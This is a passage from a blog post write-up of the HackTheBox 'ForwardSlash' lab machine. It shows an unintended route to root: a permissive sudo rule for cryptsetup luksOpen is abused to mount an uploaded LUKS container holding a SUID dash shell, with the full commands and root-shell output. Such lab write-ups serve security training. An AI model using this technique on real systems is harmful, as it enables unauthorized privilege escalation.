<h2 id="“Unintended”-way-to-root"><a href="#“Unintended”-way-to-root" class="headerlink" title="“Unintended” way to root"></a>“Unintended” way to root</h2><p>It was also possible to access the root flag without touching the “crypto” script at all. </p>
<p>Indeed the following sudo configuration allow to open and mount <em>any</em> luks encrypted container:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User pain may run the following commands on forwardslash:</span><br><span class="line">    (root) NOPASSWD: /sbin/cryptsetup luksOpen *</span><br></pre></td></tr></table></figure>

<p>So what does it mean ? It means that we could create, on our machine, our own container containing a SUID binary (for example) and access root this way from <code>pain</code> user. </p>
<p>Let’s see how it’s done.</p>
<p>First let’s create our container:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ fallocate -l 20M sdash.img</span><br><span class="line">[hg8@archbook ~]$ sudo cryptsetup -y luksFormat sdash.img</span><br><span class="line"></span><br><span class="line">WARNING!</span><br><span class="line">========</span><br><span class="line">This will overwrite data on dash irrevocably.</span><br><span class="line"></span><br><span class="line">Are you sure? (Type <span class="string">&#x27;yes&#x27;</span> <span class="keyword">in</span> capital letters): YES</span><br><span class="line">Enter passphrase <span class="keyword">for</span> sdash.img:</span><br><span class="line">Verify passphrase:</span><br><span class="line">[hg8@archbook ~]$</span><br></pre></td></tr></table></figure>

<p>Alright, we have our container. Next step are:</p>
<ol>
<li><p>Format and mount it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo cryptsetup luksOpen ./sdash.img backup</span><br><span class="line">Enter passphrase <span class="keyword">for</span> ./sdash.img:</span><br><span class="line">[hg8@archbook ~]$ sudo mkfs.ext4 /dev/mapper/backup</span><br><span class="line">[hg8@archbook ~]$ mkdir mnt</span><br><span class="line">[hg8@archbook ~]$ sudo mount /dev/mapper/backup ./mnt/</span><br></pre></td></tr></table></figure></li>
<li><p>Putting our SUID binary in it (I will use <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Almquist_shell"><code>dash</code></a>)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo sh -c <span class="string">&#x27;cp $(which dash) ./mnt/; chmod +s ./dash&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>Close and upload our container to the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo umount ./mnt</span><br><span class="line">[hg8@archbook ~]$ sudo cryptsetup close backup </span><br><span class="line">[hg8@archbook ~]$ scp sdash.img pain@forwardslash.htb:/tmp/.tmp/</span><br></pre></td></tr></table></figure></li>
</ol>
<p>Now let’s simply open and mount the container, the same way we saw previously for the root flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:/$ sudo /sbin/cryptsetup luksOpen sdash.img backup</span><br><span class="line">Enter passphrase <span class="keyword">for</span> dash:</span><br><span class="line">pain@forwardslash:/$ mkdir /tmp/.tmp/mnt/</span><br><span class="line">pain@forwardslash:/$ <span class="built_in">cd</span> /tmp/.tmp/</span><br><span class="line">pain@forwardslash:/tmp/.tmp/$ sudo /bin/mount /dev/mapper/backup ./mnt/</span><br><span class="line"></span><br><span class="line">pain@forwardslash:/$ ls -l /tmp/.tmp/mnt</span><br><span class="line">total 895</span><br><span class="line">-rwsr-sr-x 1 root root 903504 Apr  6 14:25 dash</span><br><span class="line">drwx------ 2 root root  12288 Apr  6 14:24 lost+found</span><br><span class="line">pain@forwardslash:/$ ./tmp/mnt/dash</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">3xxxxxxxxxxxxxxxxxxxxxxx9</span><br></pre></td></tr></table></figure>

<hr>
<p>As always do not hesitate to contact me for any questions or feedbacks :)</p>
<p>See you next time !</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Hard-Box/">Hard Box</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/LFI/" rel="tag">LFI</a>, <a class="tag-link-link" href="/tags/XML/" rel="tag">XML</a>, <a class="tag-link-link" href="/tags/XXE/" rel="tag">XXE</a>, <a class="tag-link-link" href="/tags/bruteforce/" rel="tag">bruteforce</a>, <a class="tag-link-link" href="/tags/crypto/" rel="tag">crypto</a>, <a class="tag-link-link" href="/tags/forwardslash/" rel="tag">forwardslash</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/luks/" rel="tag">luks</a>, <a class="tag-link-link" href="/tags/php-filter/" rel="tag">php filter</a>, <a class="tag-link-link" href="/tags/re/" rel="tag">re</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-flag"><span class="toc-number">1.</span> <span class="toc-text">User flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ForwardSlash-Backup-Site"><span class="toc-number">1.2.</span> <span class="toc-text">ForwardSlash Backup Site</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-1-Profile-picture-Local-File-Inclusion"><span class="toc-number">1.3.</span> <span class="toc-text">Method 1: Profile picture Local File Inclusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-2-XXE-Local-File-Inclusion-on-dev-API"><span class="toc-number">1.4.</span> <span class="toc-text">Method 2: XXE Local File Inclusion on &#x2F;dev&#x2F; API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-chiv-gt-pain"><span class="toc-number">1.5.</span> <span class="toc-text">Pivot chiv -&gt; pain</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-flag"><span class="toc-number">2.</span> <span class="toc-text">Root flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encryption-key-bruteforce"><span class="toc-number">2.2.</span> <span class="toc-text">Encryption key bruteforce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-encrypted-LUKS-image"><span class="toc-number">2.3.</span> <span class="toc-text">Accessing encrypted LUKS image</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%9CUnintended%E2%80%9D-way-to-root"><span class="toc-number">3.</span> <span class="toc-text">“Unintended” way to root</span></a></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
